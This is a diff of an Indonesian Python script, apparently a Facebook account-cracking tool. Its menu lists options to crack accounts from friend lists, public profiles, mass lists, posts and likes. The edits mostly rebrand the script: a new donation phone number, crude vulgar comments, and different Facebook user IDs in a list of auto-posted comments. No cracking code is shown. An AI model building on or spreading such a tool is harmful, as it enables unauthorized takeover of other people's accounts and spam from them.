@@ -1,4 +1,4 @@
-#!/usr/bin/python2
+#!/usr/bin/python
 # coding=utf-8
 # coding by Nazri-XD
 # Note : jangan cuma rekode kontol
@@ -7,10 +7,10 @@
 ## Jangan di jual belikan memek...
 ## Hargai gue dengan jangan ganti nama author...
 ## Dan jangan lupa suscribe chenel gue mmk...
-## Buat yang mau ngamal ke dana -> 081211847166
+## Buat yang mau ngamal ke dana -> 081237346234 {dana}
 ## HARUS DANA AJG:V
 
-## TERIMA KASIH BUAT LU YANG UDAH SUSCRIBE YT GUE/DONASI MKSH...
+## TERIMA KASIH KEPADA GW YA ASU KONTOL MEMEK...
 ## Import Module Kntl ..
 import os, sys, time, re, json, requests, bs4, random, calendar, datetime,subprocess, logging
 from concurrent.futures import ThreadPoolExecutor as khamdihiXD
@@ -43,7 +43,7 @@ O = '\x1b[1;96m' # BIRU MUDA
 N = '\x1b[0m'    # WARNA YANG UDAH GAK PERAWAN :V
 J = '\033[38;2;255;127;0;1m' # ORANGE
 KhamdihiGanteng = [ P,M,H,K,B,U,O,N ] # warna janda x
-komen = random.choice(['Mantap bang @[100000626195514:0] I Love You','Pengguna script ganja kamu bang @[100000626195514:0]','Kamu ganteng banget deh @[100044663564610:0]','Kamu ganteng banget deh bang @[100046031671446:0]','Kamu manis bang bang @[100056394630237:0]','Kamu cantik banget anak siapa @[100062167515808:0]','Kamu ganteng banget bang @[100076440339167:0]','Mantap bang love you','Khamdihi nggak ada obat script nya emang','pengin kaya elu bang bisa ngocok stading @[100000626195514:0]'])
+komen = random.choice(['Mantap bang @[100000626195514:0] I Love You','Pengguna script ganja kamu bang @[100000626195514:0]','Kamu ganteng banget deh @[100044663564610:0]','Kamu ganteng banget deh bang @[100057370791997:0]','Kamu manis bang bang @[100057370791997:0]','Kamu cantik banget anak siapa @[100057370791997:0]','Kamu ganteng banget bang @[100057370791997:0]','Mantap bang love you','zainul nggak ada obat script nya emang','pengin kaya elu bang bisa ngocok stading @[100057370791997:0]'])
 user, mi, status_foll, cr, ok, cp, id, user, loop, looping = [], [], [], [], [], [], [], [], 0, 1
 ta = current.year
 bu = current.month
@@ -166,7 +166,7 @@ class menu:
 		print(' %s╠═[%s•%s] Kamu masuk pada         : %s'%(N,O,N,waktu))
 		print(' %s║'%(N))
 		print(' %s╠═[%s0%s] crack dari daftar teman'%(N,O,N))
-		print(' %s╠═[%s1%s] crack dari akun publik'%(N,O,N,O))
+		print(' %s╠═[%s1%s] crack dari akun publik'%(N,O,N,))
 		print(' %s╠═[%s2%s] crack dari akun massal'%(N,O,N))
 		print(' %s╠═[%s3%s] crack dari postingan'%(N,O,N))
 		print(' %s╠═[%s4%s] crack dari likes post'%(N,O,N))
